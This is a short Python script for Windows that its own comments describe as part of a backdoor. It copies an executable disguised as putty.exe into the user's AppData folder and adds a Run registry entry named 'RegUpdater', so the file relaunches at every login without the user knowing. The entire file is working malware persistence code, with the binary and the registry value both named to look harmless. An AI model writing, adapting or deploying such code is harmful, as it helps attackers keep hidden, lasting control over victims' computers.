import os
import shutil
import winreg as wreg
from subprocess import Popen, PIPE
#To restart any file after being restarted by the windows OS, Automatic Start Up
#to use edit the putty.exe with your desired app


path = os.getcwd().strip('/n')
#get current working directory where the backdoor gets executed

CMD = Popen('set USERPROFILE', shell=True, stdout=PIPE, stderr=PIPE)
result= CMD.stdout.read().decode('utf-8')

null, userprof = result.split('=')

#Get UserProfile

destination = userprof.strip('\n\r')+ '\\AppData\\Local\\'  + "putty.exe"
#specify where to copy your backdoor

if not os.path.exists(destination):
    #First time our backdoor is being executed

    #Copy our Backdoor to C:\Users\<username>\AppData\Local
    shutil.copyfile(path + "\\putty.exe", destination)

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, wreg.KEY_ALL_ACCESS)

    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
   # Close()
    #Create a New Registry called RegUpdater pointing to our new backdoor path
    
    
